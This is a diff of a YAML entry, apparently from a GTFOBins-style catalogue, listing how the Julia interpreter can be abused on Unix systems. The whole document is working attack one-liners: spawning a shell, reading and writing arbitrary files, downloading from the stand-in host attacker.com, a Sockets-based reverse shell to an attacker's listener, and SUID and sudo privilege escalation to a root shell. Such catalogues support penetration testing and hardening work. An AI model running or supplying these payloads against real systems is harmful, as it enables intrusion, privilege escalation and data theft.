@@ -1,16 +1,21 @@
 ---
-description: |
-All payloads are compatible with the Base packages from Julia.
 functions:
   shell:
-    - description: The `run()` function runs every command passed as parameter with what is defined in `$JULIA_SHELL`. Defaults to the environment variable `$SHELL`, and falls back to `/bin/sh` if `$SHELL` is unset.
-    - code: julia -e 'while true; c = split(readline()); run(`$c`); end;'
+    - code: |
+        julia -e 'run(`/bin/sh`)'
   file-read:
-    - code: julia -e 'println(open(f->read(f, String), "file_to_read"))'
+    - code: |
+        export LFILE=file_to_read
+        julia -e 'print(open(f->read(f, String), ENV["LFILE"]))'
   file-write:
-    - code: julia -e 'open(f->write(f, "DATA"), "file_to_write", "w")'
+    - code: |
+        export LFILE=file_to_write
+        julia -e 'open(f->write(f, "DATA"), ENV["LFILE"], "w")'
   file-download:
-    - code: julia -e 'download("URL", "PATH")'
+    - code: |
+        export URL=http://attacker.com/file_to_get
+        export LFILE=file_to_save
+        julia -e 'download(ENV["URL"], ENV["LFILE"])'
   reverse-shell:
     - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
@@ -18,8 +23,9 @@ functions:
         export RPORT=12345
         julia -e 'using Sockets; sock=connect(ENV["RHOST"], parse(Int64,ENV["RPORT"])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
   suid:
-    - code: julia -e 'while true; c = split(readline()); run(`$c`); end;'
+    - code: |
+        ./julia -e 'run(`/bin/sh -p`)'
   sudo:
-    - description: If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
-    - code: sudo julia -e 'while true; c = split(readline()); run(`$c`); end;'
+    - code: |
+        sudo julia -e 'run(`/bin/sh`)'
 ---
